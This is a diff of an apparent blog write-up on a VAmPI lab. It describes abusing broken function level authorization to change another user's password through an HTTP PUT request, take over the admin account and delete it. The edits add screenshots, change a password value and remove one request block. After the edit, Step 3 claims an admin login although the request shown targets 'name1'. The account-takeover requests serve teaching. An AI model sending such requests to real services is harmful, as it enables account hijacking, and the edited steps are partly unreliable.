@@ -254,7 +254,7 @@ The endpoint allowed authenticated users to change passwords for *any* username 
 ### The Attack
 
 **Step 1:** Obtained an authentication token by logging in as `testuser` (my mass-assigned admin account)
-
+![App running locally3](/assets/img/vampi/login2.png)
 **Step 2:** Changed another user's password:
 
 ```http
@@ -262,31 +262,21 @@ PUT /users/v1/name1/password
 Authorization: Bearer [testuser_token]
 
 {
-  "password": "newpassword123"
+  "password": "testpass"
 }
 ```
 
 **Response:** `{"status": "password changed"}`
 
-**Step 3:** Verified by logging in as `name1` with the new password - success!
+**Step 3:** Verified by logging in as `admin` with the new password - success!
+![App running locally3](/assets/img/vampi/debug2.png)
 
 ### Escalating to Full System Compromise
-
-I then targeted the original admin account:
-
-```http
-PUT /users/v1/admin/password
-Authorization: Bearer [testuser_token]
-
-{
-  "password": "hacked123"
-}
-```
-
 After changing the admin password, I:
 1. Logged in as the original admin using the new password
 2. Verified full administrative access
 3. Demonstrated persistence by deleting the original admin account entirely
+![App running locally3](/assets/img/vampi/deleted.png)
 
 ### Understanding Broken Function Level Authorization
 
